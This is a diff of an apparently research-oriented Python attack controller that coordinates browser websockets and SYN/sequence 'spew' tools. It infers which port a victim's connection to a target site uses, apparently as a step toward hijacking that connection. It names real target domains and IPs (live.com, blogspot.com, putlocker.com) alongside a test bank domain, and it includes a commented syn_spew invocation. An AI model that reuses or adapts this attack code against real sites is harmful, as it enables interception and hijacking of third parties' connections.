@@ -83,7 +83,18 @@ TEST_VICTIM_IP = '12.168.1.113'
 #VICTIM_SITE = '184.169.195.56'
 VICTIM_SITE = '50.18.143.83'
 VICTIM_DOMAIN = 'bank.hobocomp.com'
-VICTIM_SITE_IPS = ['50.18.143.83', '184.169.195.56']
+#VICTIM_SITE_IPS = ['50.18.143.83', '184.169.195.56']
+
+
+#VICTIM_SITE = '65.55.206.154'
+#VICTIM_DOMAIN = 'live.com'
+
+#VICTIM_SITE='74.125.142.191'
+#VICTIM_DOMAIN='blogspot.com'
+
+#VICTIM_SITE='89.238.130.247'
+#VICTIM_DOMAIN='putlocker.com'
+
 
 NEW_CONNECTION_PERIOD = 0.01
 CONNECTION_TIMEOUT = 30.0
@@ -127,7 +138,9 @@ class ControlWebSocket(Protocol):
         #self.addr.host = TEST_VICTIM_IP
         #subprocess.call(['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
         #                 '-r', '100', '-d', '100', self.addr.host, '69.171.242.11:80'])
-        guess_ip = VICTIM_SITE_IPS[self.ip_guess_index]
+        #guess_ip = VICTIM_SITE_IPS[self.ip_guess_index]
+        guess_ip = VICTIM_SITE
+        
         (port_a, port_b) = (low_port, high_port)
         if len(self.votes) > 0:
             (port_b, port_a) = (low_port, high_port)
@@ -233,8 +246,8 @@ class ControlWebSocket(Protocol):
                     self.mid_port = int(self.min_port) + 20
                 return
 
-            print 'Found port %d used for %s' % (port, VICTIM_SITE_IPS[self.ip_guess_index])
-            self.transport.write("Found port <b>%d</b> for %s" % (port, VICTIM_SITE_IPS[self.ip_guess_index])) 
+            print 'Found port %d used for %s' % (port, VICTIM_SITE)
+            self.transport.write("Found port <b>%d</b> for %s" % (port, VICTIM_SITE)) 
 
             self.seq_spew_port = port + 1
             reactor.callLater(0.5, self.init_iframe)
@@ -332,7 +345,7 @@ class ControlWebSocket(Protocol):
         if self.bucket_search:
             testing = "(bucket) testing"
         self.transport.write("show <b>%s %s:%d - %d...</b>" % \
-            (testing, VICTIM_SITE_IPS[self.ip_guess_index], self.min_port, self.mid_port))
+            (testing, VICTIM_SITE, self.min_port, self.mid_port))
         self.transport.write("make ws://%s/" % (url))
         #self.transport.write("img %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy.
 
@@ -507,5 +520,5 @@ class ControlWebSocket(Protocol):
         self.fire_time = time.time()
         self.state = STATE_INIT
         self.ip_guess_index = 0  # index into VICTIM_SITE_IPS[]
-        self.transport.write("calm ws://%s/" % (VICTIM_SITE_IPS[self.ip_guess_index])) 
+        self.transport.write("calm ws://%s/" % (VICTIM_SITE)) 
         #self.transport.write("calm %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy. 
